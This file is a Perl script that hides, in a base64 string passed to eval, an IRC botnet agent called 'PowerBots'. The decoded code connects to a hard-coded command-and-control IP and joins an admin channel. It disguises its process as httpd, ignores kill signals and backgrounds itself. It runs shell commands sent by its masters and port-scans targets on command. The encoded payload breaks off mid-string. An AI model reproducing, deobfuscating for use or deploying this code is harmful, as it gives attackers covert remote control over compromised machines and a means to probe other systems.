#!/usr/bin/perl
use MIME::Base64;
eval(decode_base64('IyEvdXNyL2Jpbi9wZXJsDQpteSBAbWFzdDNycyA9ICgiZXIiKTsNCg0KbXkgQGhvc3RhdXRoID0gKCJkcmVhbS5jb20iKTsNCm15IEBhZG1jaGFuPSgiI3giKTsNCg0KbXkgQHNlcnZlciA9ICgiMTc4LjE4Ljg0LjE3NCIpOw0KJHNlcnZpZG9yPSAkc2VydmVyW3JhbmQgc2NhbGFyIEBzZXJ2ZXJdIHVubGVzcyAkc2Vydmlkb3I7DQoNCg0KbXkgJHhlcXQgPSAiIW9zMiI7DQpteSAkaG9tZWRpciA9ICIkcHdkIjsNCm15ICRzaGVsbGFjY2VzcyA9IDE7DQpteSAkeHN0YXRzID0gMTsNCm15ICRwYWNvdGVzID0gMTsNCm15ICRsaW5hc19tYXggPSA1Ow0KbXkgJHNsZWVwID0gNjsNCm15ICRwb3J0aW1lID0gNDsNCg0KbXkgQGZha2VwcyA9ICgiL3Vzci9zYmluL2h0dHBkIik7DQoNCm15IEBuaWNrbmFtZSA9ICgiZHJlYW0iKTsNCg0KbXkgQHhpZGVudCA9ICgibWFkIik7DQpteSBAeG5hbWUgPSAoYHVuYW1lIC1yYCk7DQoNCiMjIyMjIyMjIyMjIyMjIyMjDQojIFJhbmRvbSBQb3J0cw0KIyMjIyMjIyMjIyMjIyMjIyMNCm15IEBycG9ydHMgPSAoIjgwIik7DQoNCm15IEBNcnggPSAoIlwwMDFtSVJDMzIgdjUuOTEgSy5NYXJkYW0tQmV5XDAwMSIsIlwwMDFtSVJDIHY2LjIgS2hhbGVkIE1hcmRhbS1CZXlcMDAxIiwNCiAgICJcMDAxbUlSQyB2Ni4wMyBLaGFsZWQgTWFyZGFtLUJleVwwMDEiLCJcMDAxbUlSQyB2Ni4xNCBLaGFsZWQgTWFyZGFtLUJleVwwMDEiLA0KICAgIlwwMDFtSVJDIHY2LjE1IEtoYWxlZCBNYXJkYW0tQmV5XDAwMSIsIlwwMDFtSVJDIHY2LjE2IEtoYWxlZCBNYXJkYW0tQmV5XDAwMSIsDQogICAiXDAwMW1JUkMgdjYuMTcgS2hhbGVkIE1hcmRhbS1CZXlcMDAxIiwiXDAwMW1JUkMgdjYuMjEgS2hhbGVkIE1hcmRhbS1CZXlcMDAxIiwNCiAgICJcMDAxU25hayBmb3IgTWFjaW50b3NoIDQuOS44IEVuZ2xpc2hcMDAxIiwNCiAgICJcMDAxRHZDIHYwLjEgUEhQLTUuMS4xIGJhc2VkIG9uIE5ldF9TbWFydElSQ1wwMDEiLA0KICAgIlwwMDFQSVJDSDk4OldJTiA5NS85OC9XSU4gTlQ6MS4wIChidWlsZCAxLjAuMS4xMTkwKVwwMDEiLA0KICAgIlwwMDF4Y2hhdCAyLjYuMiBMaW51eCAyLjYuMTguNSBbaTY4Ni8yLjY3R0h6XVwwMDEiLA0KICAgIlwwMDF4Y2hhdDoyLjQuMzpMaW51eCAyLjYuMTctMS4yMTQyX0ZDNCBbaTY4Ni8yLDAwR0h6XVwwMDEiLA0KICAgIlwwMDF4Y2hhdDoyLjQuMzpMaW51eCAyLjYuMTctMS4yMTQyX0ZDNCBbaTY4Ni8xLjcwR0h6XVwwMDEiLA0KICAgIlwwMDFYQ2hhdC1HTk9NRSBJUkMgQ2hhdCAwLjE2IExpbnV4IDIuNi4yMC04LWdlbmVyaWMgW2k2ODZdXDAwMSIsDQogICAiXDAwMWlyY04gNy4yNyArIDcuMCAtIC1cMDAxIiwiXDAwMS4uKGFyZ29uLzFnKSA6Yml0Y2h4LTEuMGMxN1wwMDEiLA0KICAgIlwwMDFpcmNOIDguMDAgLSBoZSB0cmllcyB0byB0ZWxsIG1lIHdoYXQgSSBwdXQgaW5zaWRlIG9mIG1lIC1cMDAxIiwNCiAgICJcMDAxRnJlZUJTRCE0LjExLVNUQUJMRSBiaXRjaHgtMS4wYzE4IC0gcHJldmFpbFswMTIzXSA6ZG93biB3aXRoIHBlb3BsZVwwMDEiLA0KICAgIlwwMDFCaXRjaFgtMS4wYzE5KyBieSBwYW5hc3luYyAtIExpbnV4IDIuNC4zMSA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjBjMTkrIGJ5IHBhbmFzeW5jIC0gTGludXggMi40LjMzLjMgOiBLZWVwIGl0IHRvIHlvdXJzZWxmIVwwMDEiLA0KICAgIlwwMDFCaXRjaFgtMS4xLWZpbmFsKyBieSBwYW5hc3luYyAtIExpbnV4IDIuNi4xOC4xIDogS2VlcCBpdCB0byB5b3Vyc2VsZiFcMDAxIiwNCiAgICJcMDAxQml0Y2hYLTEuMGMxOSBieSBwYW5hc3luYyAtIGZyZWVic2QgNC4xMC1TVEFCTEUgOiBLZWVwIGl0IHRvIHlvdXJzZWxmIVwwMDEiLA0KICAgIlwwMDFCaXRjaFgtMS4xLWZpbmFsKyBieSBwYW5hc3luYyAtIEZyZWVCU0QgNC41LVNUQUJMRSA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjEtZmluYWwrIGJ5IHBhbmFzeW5jIC0gRnJlZUJTRCA2LjAtUkVMRUFTRSA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjEtZmluYWwrIGJ5IHBhbmFzeW5jIC0gRnJlZUJTRCA1LjMtUkVMRUFTRSA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMWJpdGNoeC0xLjBjMTggOnR1bm5lbHZpc2lvbi8xLjJcMDAxIiwiXDAwMVBuUCA0LjIyIC0gaHR0cDovL3d3dy5wYWlyYy5jb20vXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjBjMTcvRnJlZUJTRCA0LjEwLVJFTEVBU0U6KGMpcmFja3JvY2svYlggWzMuMC4xPz85XSA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMVAmUCA0LjIyLjIgKGluIGRldmVsb3BtZW50KSArIFggWiBQIEJvdHMsIFNvdW5kLCBOaWNrU2VydiwgQ2hhblNlcnYsIEV4dHJhc1wwMDEiLA0KICAgIlwwMDFIeWRyYUlSQyB2MC4zLjE0OCAoMTgvSmFuLzIwMDUpIGJ5IERvbWluaWMgQ2xpZnRvbiBha2EgSHlkcmEgLSAjSHlkcmFJUkMgb24gRUZOZXRcMDAxIiwNCiAgICJcMDAxaXJzc2kgdjAuOC4xMCAtIHJ1bm5pbmcgb24gTGludXggaTU4NlwwMDEiLCJcMDAxaXJzc2kgdjAuOC4xMCAtIHJ1bm5pbmcgb24gRnJlZUJTRCBpMzg2XDAwMSIsDQogICAiXDAwMWlyY0lJIDIwMDUwNDIzK1Njcm9sbFogMS45LjUgKDE5LjEyLjIwMDQpK0NkY2MgdjEuNm1vZHMgdjEuMCBieSBhY2lkZmxhc2ggLSBBbG1vc3QgdGhlcmVcMDAxIiwNCiAgICJcMDAxaXJjSUkgMjAwNTA0MjMrU2Nyb2xsWiAxLjkuNSAoMTkuMTIuMjAwNCkrQ2RjYyB2MS44K09wZXJNb2RzIHYxLjAgYnkgYWNpZGZsYXNoIC0gQWxtb3N0IHRoZXJlXDAwMSIpOw0KDQojIERlZmF1bHQgcXVpY2sgc2NhbiBwb3J0cw0KbXkgQHBvcnRhcz0oIjIxIiwiMjIiLCIyMyIsIjI1IiwiNTMiLCI4MCIsIjExMCIsIjExMyIsIjE0MyIsIjMzMDYiLCI0MDAwIiwiNTkwMCIsIjY2NjciLCI2NjY4IiwiNjY2OSIsIjcwMDAiLCIxMDAwMCIsIjEyMzQ1IiwiMzEzMzciLCI2NTUwMSIpOw0KDQojIHhlUXQNCg0KI215ICRuaWNrID0gIlBvd2VyIjsNCm15ICRuaWNrID0gJG5pY2tuYW1lW3JhbmQgc2NhbGFyIEBuaWNrbmFtZV07DQpteSAkcmVhbG5hbWUgPSAkeG5hbWVbcmFuZCBzY2FsYXIgQHhuYW1lXTsNCm15ICRpcmNuYW1lID0gJHhpZGVudFtyYW5kIHNjYWxhciBAeGlkZW50XTsNCm15ICRwb3J0YSA9ICRycG9ydHNbcmFuZCBzY2FsYXIgQHJwb3J0c107DQpteSAkeHByb2MgPSAkZmFrZXBzW3JhbmQgc2NhbGFyIEBmYWtlcHNdOw0KbXkgJE1yeCA9ICRNcnhbcmFuZCBzY2FsYXIgQE1yeF07DQpteSAkdmVyc2lvbiA9ICdQb3dlckJvdHMgKEMpIEdvaGFjSyc7DQpteSAkZWNobyA9ICJgZWNob2AgJDEiOw0KDQokU0lHeydJTlQnfSA9ICdJR05PUkUnOw0KJFNJR3snSFVQJ30gPSAnSUdOT1JFJzsNCiRTSUd7J1RFUk0nfSA9ICdJR05PUkUnOw0KJFNJR3snQ0hMRCd9ID0gJ0lHTk9SRSc7DQokU0lHeydQUyd9ID0gJ0lHTk9SRSc7DQoNCg0KDQoNCg0KdXNlIElPOjpTb2NrZXQ7DQp1c2UgU29ja2V0Ow0KdXNlIElPOjpTZWxlY3Q7DQpjaGRpcigiJGhvbWVkaXIiKTsNCiRzZXJ2aWRvcj0iJEFSR1ZbMF0iIGlmICRBUkdWWzBdOw0KJDA9IiR4cHJvYyIuIlwwIjsNCm15ICRwaWQ9Zm9yazsNCmV4aXQgaWYgJHBpZDsNCmRpZSAiW3hdIC0+IENhbm5vdCBmb3JrIGludG8gYmFja2dyb3VuZDogJCEiIHVubGVzcyBkZWZpbmVkKCRwaWQpOw0KbXkgJWlyY19zZXJ2ZXJzOw0KbXkgJURDQzsNCm15ICRkY2Nfc2VsID0gbmV3IElPOjpTZWxlY3QtPm5ldygpOw0KDQpzdWIgZ2V0bmljayB7DQogIHJldHVybiAiJG5pY2tuYW1lW3JhbmQgc2NhbGFyIEBuaWNrbmFtZV0iLmludChyYW5kKDIwMDAwKSk7DQp9DQoNCnN1YiBnZXRzdG9yZSAoJCQpDQp7DQogIG15ICR1cmwgPSBzaGlmdDsNCiAgbXkgJGZpbGUgPSBzaGlmdDsNCg0KICAkaHR0cF9zdHJlYW1fb3V0ID0gMTsNCiAgb3BlbihHRVRfT1VURklMRSwgIj4gJGZpbGUiKTsNCiAgJWh0dHBfbG9vcF9jaGVjayA9ICgpOw0KICBfZ2V0KCR1cmwpOw0KICBjbG9zZSBHRVRfT1VURklMRTsNCiAgcmV0dXJuICRtYWluOjpodHRwX2dldF9yZXN1bHQ7DQp9DQpzdWIgX2dldA0Kew0KICBteSAkdXJsID0gc2hpZnQ7DQogIG15ICRwcm94eSA9ICIiOw0KICBncmVwIHsobGMoJF8pIGVxICJodHRwX3Byb3h5IikgJiYgKCRwcm94eSA9ICRFTlZ7JF99KX0ga2V5cyAlRU5WOw0KICBpZiAoKCRwcm94eSBlcSAiIikgJiYgJHVybCA9fiBtLF5odHRwOi8vKFteLzpdKykoPzo6KFxkKykpPygvXFMqKT8kLCkgew0KICAgIG15ICRob3N0ID0gJDE7DQogICAgbXkgJHBvcnQgPSAkMiB8fCA4MDsNCiAgICBteSAkcGF0aCA9ICQzOw0KICAgICRwYXRoID0gIi8iIHVubGVzcyBkZWZpbmVkKCRwYXRoKTsNCiAgICByZXR1cm4gX3RyaXZpYWxfaHR0cF9nZXQoJGhvc3QsICRwb3J0LCAkcGF0aCk7DQogIH0gZWxzaWYgKCRwcm94eSA9fiBtLF5odHRwOi8vKFteLzpdKyk6KFxkKykoL1xTKik/JCwpIHsNCiAgICBteSAkaG9zdCA9ICQxOw0KICAgIG15ICRwb3J0ID0gJDI7DQogICAgbXkgJHBhdGggPSAkdXJsOw0KICAgIHJldHVybiBfdHJpdmlhbF9odHRwX2dldCgkaG9zdCwgJHBvcnQsICRwYXRoKTsNCiAgfSBlbHNlIHsNCiAgICByZXR1cm4gdW5kZWY7DQogIH0NCn0NCnN1YiBfdHJpdmlhbF9odHRwX2dldA0Kew0KICBteSgkaG9zdCwgJHBvcnQsICRwYXRoKSA9IEBfOw0KICBteSgkQUdFTlQsICRWRVJTSU9OLCAkcCk7DQogICNwcmludCAiSE9TVD0kaG9zdCwgUE9SVD0kcG9ydCwgUEFUSD0kcGF0aFxuIjsNCg0KICAkQUdFTlQgPSAiZ2V0LW1pbmltYWwiOw0KICAkVkVSU0lPTiA9ICIyMDAwMDExOCI7DQoNCiAgJHBhdGggPX4gcy8gLyUyMC9nOw0KDQogIHJlcXVpcmUgSU86OlNvY2tldDsNCiAgbG9jYWwoJF5XKSA9IDA7DQogIG15ICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFBlZXJBZGRyID0+ICRob3N0LCBQZWVyUG9ydCA9PiAkcG9ydCwgUHJvdG8gICA9PiAndGNwJywgVGltZW91dCAgPT4gNjApIHx8IHJldHVybjsNCg0KICAkc29jay0+YXV0b2ZsdXNoOw0KICBteSAkbmV0bG9jID0gJGhvc3Q7DQogICRuZXRsb2MgLj0gIjokcG9ydCIgaWYgJHBvcnQgIT0gODA7DQogIG15ICRyZXF1ZXN0ID0gIkdFVCAkcGF0aCBIVFRQLzEuMFwwMTVcMDEyIg0KICAgICAgICAgICAgICAuICJIb3N0OiAkbmV0bG9jXDAxNVwwMTIiDQogICAgICAgICAgICAgIC4gIlVzZXItQWdlbnQ6ICRBR0VOVC8kVkVSU0lPTi91XDAxNVwwMTIiOw0KICAkcmVxdWVzdCAuPSAiUHJhZ21hOiBuby1jYWNoZVwwMTVcMDEyIiBpZiAoJG1haW46Omh0dHBfbm9fY2FjaGUpOw0KICAkcmVxdWVzdCAuPSAiXDAxNVwwMTIiOw0KICBwcmludCAkc29jayAkcmVxdWVzdDsNCiAgbXkgJGJ1ZiA9ICIiOw0KICBteSAkbjsNCiAgbXkgJGIxID0gIiI7DQogIHdoaWxlICgkbiA9IHN5c3JlYWQoJHNvY2ssICRidWYsIDgqMTAyNCwgbGVuZ3RoKCRidWYpKSkgew0KICAgIGlmICgkYjEgZXEgIiIpIHsNCiAgICAgICRiMSA9ICRidWY7DQogICAgICAkYnVmID1+IHMvLis/XDAxNT9cMDEyXDAxNT9cMDEyLy9zOw0KICAgIH0NCiAgICBpZiAoJGh0dHBfc3RyZWFtX291dCkgeyBwcmludCBHRVRfT1VURklMRSAkYnVmOyAkYnVmID0gIiI7IH0NCiAgfQ0KICByZXR1cm4gdW5kZWYgdW5sZXNzIGRlZmluZWQoJG4pOw0KICAkbWFpbjo6aHR0cF9nZXRfcmVzdWx0ID0gMjAwOw0KICBpZiAoJGIxID1+IG0sXkhUVFAvXGQrXC5cZCtccysoXGQrKVteXDAxMl0qXDAxMiwpIHsNCiAgICAkbWFpbjo6aHR0cF9nZXRfcmVzdWx0ID0gJDE7DQogICAgIyBwcmludCAiQ09ERT0kbWFpbjo6aHR0cF9nZXRfcmVzdWx0XG4kYjFcbiI7DQogICAgaWYgKCRtYWluOjpodHRwX2dldF9yZXN1bHQgPX4gL14zMFsxMjM3XS8gJiYgJGIxID1+IC9cMDEyTG9jYXRpb246XHMqKFxTKykvKSB7DQogICAgICBteSAkdXJsID0gJDE7DQogICAgICByZXR1cm4gdW5kZWYgaWYgJGh0dHBfbG9vcF9jaGVja3skdXJsfSsrOw0KICAgICAgcmV0dXJuIF9nZXQoJHVybCk7DQogICAgfQ0KICAgIHJldHVybiB1bmRlZiB1bmxlc3MgJG1haW46Omh0dHBfZ2V0X3Jlc3VsdCA9fiAvXjIvOw0KICB9DQogIHJldHVybiAkYnVmOw0KfQ0KJHNlbF9jbGllbnRlID0gSU86OlNlbGVjdC0+bmV3KCk7DQpzdWIgc2VuZHJhdyB7DQogIGlmICgkI18gPT0gJzEnKSB7DQogICAgbXkgJHNvY2tldCA9ICRfWzBdOw0KICAgIHByaW50ICRzb2NrZXQgIiRfWzFdXG4iOw0KICB9IGVsc2Ugew0KICAgICAgcHJpbnQgJElSQ19jdXJfc29ja2V0ICIkX1swXVxuIjsNCiAgfQ0KfQ0Kc3ViIGNvbmVjdGFyIHsNCiAgIG15ICRtZXVuaWNrID0gJF9bMF07DQogICBteSAkc2Vydmlkb3JfY29uID0gJF9bMV07DQogICBteSAkcG9ydGFfY29uID0gJF9bMl07DQogICBteSAkSVJDX3NvY2tldCA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90bz0+InRjcCIsIFBlZXJBZGRyPT4iJHNlcnZpZG9yX2NvbiIsIFBlZXJQb3J0PT4kcG9ydGFfY29uKSBvciByZXR1cm4oMSk7DQogICBpZiAoZGVmaW5lZCgkSVJDX3NvY2tldCkpIHsNCiAgICAgJElSQ19jdXJfc29ja2V0ID0gJElSQ19zb2NrZXQ7DQogICAgICRJUkNfc29ja2V0LT5hdXRvZmx1c2goMSk7DQogICAgICRzZWxfY2xpZW50ZS0+YWRkKCRJUkNfc29ja2V0KTsNCiAgICAgJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J2hvc3QnfSA9ICIkc2Vydmlkb3JfY29uIjsNCiAgICAgJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J3BvcnRhJ30gPSAiJHBvcnRhX2NvbiI7DQogICAgICRpcmNfc2VydmVyc3skSVJDX2N1cl9zb2NrZXR9eyduaWNrJ30gPSAkbWV1bmljazsNCiAgICAgJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J21ldWlwJ30gPSAkSVJDX3NvY2tldC0+c29ja2hvc3Q7DQogICAgIG5pY2soIiRtZXVuaWNrIik7DQogICAgIHNlbmRyYXcoIlVTRVIgJGlyY25hbWUgIi4kSVJDX3NvY2tldC0+c29ja2hvc3QuIiAkc2Vydmlkb3JfY29uIDokcmVhbG5hbWUiKTsNCiAgICAgc2xlZXAgMjsNCiAgIH0NCn0NCm15ICRsaW5lX3RlbXA7DQp3aGlsZSggMSApIHsNCiAgIHdoaWxlICghKGtleXMoJWlyY19zZXJ2ZXJzKSkpIHsgY29uZWN0YXIoIiRuaWNrIiwgIiRzZXJ2aWRvciIsICIkcG9ydGEiKTsgfQ0KICAgZGVsZXRlKCRpcmNfc2VydmVyc3snJ30pIGlmIChkZWZpbmVkKCRpcmNfc2VydmVyc3snJ30pKTsNCiAgICZEQ0M6OmNvbm5lY3Rpb25zOw0KICAgbXkgQHJlYWR5ID0gJHNlbF9jbGllbnRlLT5jYW5fcmVhZCgwLjYpOw0KICAgbmV4dCB1bmxlc3MoQHJlYWR5KTsNCiAgIGZvcmVhY2ggJGZoIChAcmVhZHkpIHsNCiAgICAgJElSQ19jdXJfc29ja2V0ID0gJGZoOw0KICAgICAkbWV1bmljayA9ICRpcmNfc2VydmVyc3skSVJDX2N1cl9zb2NrZXR9eyduaWNrJ307DQogICAgICRucmVhZCA9IHN5c3JlYWQoJGZoLCAkbXNnLCA0MDk2KTsNCiAgICAgaWYgKCRucmVhZCA9PSAwKSB7DQogICAgICAgICRzZWxfY2xpZW50ZS0+cmVtb3ZlKCRmaCk7DQogICAgICAgICRmaC0+Y2xvc2U7DQogICAgICAgIGRlbGV0ZSgkaXJjX3NlcnZlcnN7JGZofSk7DQogICAgIH0NCiAgICAgQGxpbmVzID0gc3BsaXQgKC9cbi8sICRtc2cpOw0KICAgICBmb3IobXkgJGM9MDsgJGM8PSAkI2xpbmVzOyAkYysrKSB7DQogICAgICAgJGxpbmUgPSAkbGluZXNbJGNdOw0KICAgICAgICRsaW5lPSRsaW5lX3RlbXAuJGxpbmUgaWYgKCRsaW5lX3RlbXApOw0KICAgICAgICRsaW5lX3RlbXA9Jyc7DQogICAgICAgJGxpbmUgPX4gcy9cciQvLzsNCiAgICAgICB1bmxlc3MgKCRjID09ICQjbGluZXMpIHsNCiAgICAgICAgIHBhcnNlKCIkbGluZSIpOw0KICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgIGlmICgkI2xpbmVzID09IDApIHsNCiAgICAgICAgICAgICBwYXJzZSgiJGxpbmUiKTsNCiAgICAgICAgICAgfSBlbHNpZiAoJGxpbmVzWyRjXSA9fiAvXHIkLykgew0KICAgICAgICAgICAgICAgcGFyc2UoIiRsaW5lIik7DQogICAgICAgICAgIH0gZWxzaWYgKCRsaW5lID1+IC9eKFxTKykgTk9USUNFIEFVVEggOlwqXCpcKi8pIHsNCiAgICAgICAgICAgICAgIHBhcnNlKCIkbGluZSIpOw0KICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgJGxpbmVfdGVtcCA9ICRsaW5lOw0KICAgICAgICAgICB9DQogICAgICAgfQ0KICAgICAgfQ0KICAgfQ0KfQ0KDQpzdWIgcGFyc2Ugew0KICAgbXkgJHNlcnZhcmcgPSBzaGlmdDsNCiAgIGlmICgkc2VydmFyZyA9fiAvXlBJTkcgXDooLiopLykgew0KICAgICBzZW5kcmF3KCJQT05HIDokMSIpOw0KICAgfSBlbHNpZiAoJHNlcnZhcmcgPX4gL15cOiguKz8pXCEoLis/KVxAKC4rPykgUFJJVk1TRyAoLis/KSBcOiguKykvKSB7DQogICAgICAgbXkgJHBuPSQxOyBteSAkaG9zdG5hbTM9JDM7IG15ICRvbmRlID0gJDQ7IG15ICRhcmdzID0gJDU7DQogICAgICAgaWYgKCRhcmdzID1+IC9eXDAwMVZFUlNJT05cMDAxJC8pIHsNCiAgICAgICAgIG5vdGljZSgiJHBuIiwgIiIuJE1yeC4iIik7DQogICAgICAgfQ0KICAgICAgIGVsc2lmICgkYXJncyA9fiAvXlwwMDFQSU5HXHMrKFxkKylcMDAxJC8pIHsNCiAgICAgICAgIG5vdGljZSgiJHBuIiwgIlwwMDFQT05HXDAwMSIpOw0KICAgICAgIH0NCiAgICAgICBpZiAoZ3JlcCB7JF8gPX4gL15cUSRob3N0bmFtM1xFJC9pIH0gQGhvc3RhdXRoKSB7DQogICAgICAgaWYgKGdyZXAgeyRfID1+IC9eXFEkcG5cRSQvaSB9IEBtYXN0M3JzKSB7DQogICAgICAgICBpZiAoJG9uZGUgZXEgIiRtZXVuaWNrIil7DQogICAgICAgICAgIHNoZWxsKCIkcG4iLCAiJGFyZ3MiKTsNCiAgICAgICAgfQ0KICAgIGlmICgkYXJncyA9fiAvXiEoLiopLyl7DQogICAgICAgaXJjYXNlKCIkcG4iLCIkY2hhbiIsIiQxIik7DQogICAgfQ0KICAgICAgICBpZiAoJGFyZ3MgPX4gL14oXFEkbWV1bmlja1xFfFxRJHhlcXRcRSlccysoLiopLyApIHsNCiAgICAgICAgICAgIG15ICRuYXRyaXggPSAkMTsNCiAgICAgICAgICAgIG15ICRhcmcgPSAkMjsNCiAgICAgICAgICAgIGlmICgkYXJnID1+IC9eXCEoLiopLykgew0KICAgICAgICAgICAgICBpcmNhc2UoIiRwbiIsIiRvbmRlIiwiJDEiKTsNCiAgICAgICAgICAgIH0gZWxzaWYgKCRhcmcgPX4gL15cQCguKikvKSB7DQogICAgICAgICAgICAgICAgJG9uZGVwID0gJG9uZGU7DQogICAgICAgICAgICAgICAgJG9uZGVwID0gJHBuIGlmICRvbmRlIGVxICRtZXVuaWNrOw0KICAgICAgICAgICAgICAgIGJmdW5jKCIkb25kZXAiLCIkMSIpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBzaGVsbCgiJG9uZGUiLCAiJGFyZyIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfQ0KICAgfSBlbHNpZiAoJHNlcnZhcmcgPX4gL15cOiguKz8pXCEoLis/KVxAKC4rPylccytOSUNLXHMrXDooXFMrKS9pKSB7DQogICAgICAgaWYgKGxjKCQxKSBlcSBsYygkbWV1bmljaykpIHsNCiAgICAgICAgICRtZXVuaWNrPSQ0Ow0KICAgICAgICAgJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J25pY2snfSA9ICRtZXVuaWNrOw0KICAgICAgIH0NCiAgIH0gZWxzaWYgKCRzZXJ2YXJnID1+IG0vXlw6KC4rPylccys0MzMvaSkgew0KICAgICAgICRtZXVuaWNrID0gZ2V0bmljaygpOw0KICAgICAgIG5pY2soIiIuJG1ldW5pY2suIi0iKTsNCiAgIH0gZWxzaWYgKCRzZXJ2YXJnID1+IG0vXlw6KC4rPylccyswMDFccysoXFMrKVxzL2kpIHsNCiAgICAgICAkbWV1bmljayA9ICQyOw0KICAgICAgICRpcmNfc2VydmVyc3skSVJDX2N1cl9zb2NrZXR9eyduaWNrJ30gPSAkbWV1bmljazsNCiAgICAgICAkaXJjX3NlcnZlcnN7JElSQ19jdXJfc29ja2V0fXsnbm9tZSd9ID0gIiQxIjsNCiAgICAgICBmb3JlYWNoIG15ICRjYW5hbCAoQGFkbWNoYW4pew0KICAgICAgICAgc2VuZHJhdygiSk9JTiAkY2FuYWwgbXVpZXRpZSIpOw0KICAgICAgIH0NCiAgIH0NCn0NCnN1YiBiZnVuYyB7DQogIG15ICRwcmludGwgPSAkX1swXTsNCiAgbXkgJGZ1bmNhcmcgPSAkX1sxXTsNCiAgaWYgKG15ICRwaWQgPSBmb3JrKSB7DQogICAgIHdhaXRwaWQoJHBpZCwgMCk7DQogIH0gZWxzZSB7DQogICAgICBpZiAoZm9yaykNCiAgICAgICB7DQogICAgICAgICBleGl0Ow0KICAgICAgIH0NCiAgIGVsc2UNCiAgIHsNCiAgICAgICMgUXVpY2sgc2Nhbg0KICAgICAgICAgICBpZiAoJGZ1bmNhcmcgPX4gL15wcyAoLiopLykgew0KICAgICAgICAgICAgIG15ICRob3N0aXA9IiQxIjsNCiAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOlwwMDJcMDAzMTJQb3J0c2Nhbm5pbmdcMDAzXDAwMjogJDEgXDAwMlwwMDMxMlBvcnRzOlwwMDNcMDAyIGRlZmF1bHQiKTsNCiAgICAgICAgICAgICBteSAoQGFiZXJ0YSwgJXBvcnRhX2Jhbm5lcik7DQogICAgICAgICAgICAgZm9yZWFjaCBteSAkcG9ydGEgKEBwb3J0YXMpICB7DQogICAgICAgICAgICAgICAgbXkgJHNjYW5zb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFBlZXJBZGRyID0+ICRob3N0aXAsIFBlZXJQb3J0ID0+ICRwb3J0YSwgUHJvdG8gPT4gJ3RjcCcsIFRpbWVvdXQgPT4gJHBvcnRpbWUpOw0KICAgICAgICAgICAgICAgIGlmICgkc2NhbnNvY2spIHsNCiAgICAgICAgICAgICAgICAgICBwdXNoIChAYWJlcnRhLCAkcG9ydGEpOw0KICAgICAgICAgICAgICAgICAgICRzY2Fuc29jay0+Y2xvc2U7DQogICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6Rm91bmQ6ICRwb3J0YSIuIi9PcGVuIik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICBpZiAoQGFiZXJ0YSkgew0KICAgICAgICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOlBvcnQgU2NhbiBDb21wbGV0ZSB3aXRoIHRhcmdldDogJDEgIik7DQogICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsIlBSSVZNU0cgJHByaW50bCA6XDAwMlt4XVwwMDM0IE5vIG9wZW4gcG9ydHMgZm91bmQgb25cMDAyICQxIik7DQogICAgICAgICAgICAgfQ0KICAgICAgICAgICB9DQogICAgICAjIE5NQVAsIGxvbA0KICAgICAgICAgICBlbHNpZiAoJGZ1bmNhcmcgPX4gL15ubWFwXHMrKC4qKVxzKyhcZCspXHMrKFxkKykvKQ0KICAgICAgew0KICAgICAgICAgICAgICBteSAkaG9zdG5hbWU9IiQxIjsNCiAgICAgICAgICAgICAgbXkgJHBvcnRzdGFydCA9ICIkMiI7DQogICAgICAgICAgICAgICBteSAkcG9ydGVuZCA9ICIkMyI7DQogICAgICAgICAgICAgICBteSAoQGFiZXJ0YXMsICVwb3J0YV9iYW5uZXIpOw0KICAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyeE1hcCBQb3J0c2Nhbm5pbmdcMDAzXDAwMjogJDEgXDAwMlwwMDMxMlBvcnRzOlwwMDNcMDAyICQyLSQzIik7DQogICAgICAgICAgICAgICBmb3JlYWNoIG15ICRwb3J0YSAoJHBvcnRzdGFydC4uJHBvcnRlbmQpDQogICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgbXkgJHNjYW5zb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFBlZXJBZGRyID0+ICRob3N0bmFtZSwgUGVlclBvcnQgPT4gJHBvcnRhLCBQcm90byA9PiAndGNwJywgVGltZW91dCA9PiAkcG9ydGltZSk7DQogICAgICAgICAgICAgICBpZiAoJHNjYW5zb2NrKSB7DQogICAgICAgICAgICAgICAgIHB1c2ggKEBhYmVydGFzLCAkcG9ydGEpOw0KICAgICAgICAgICAgICAgICAkc2NhbnNvY2stPmNsb3NlOw0KICAgICAgICAgICAgICAgICBpZiAoJHhzdGF0cykNCiAgICAgICB7DQogICAgICAgICAgICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOkZvdW5kOiAkcG9ydGEiLiIvT3BlbiIpOw0KICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgfQ0KICAgICAgICAgICAgIGlmIChAYWJlcnRhcykgew0KICAgICAgICAgIHNlbmRy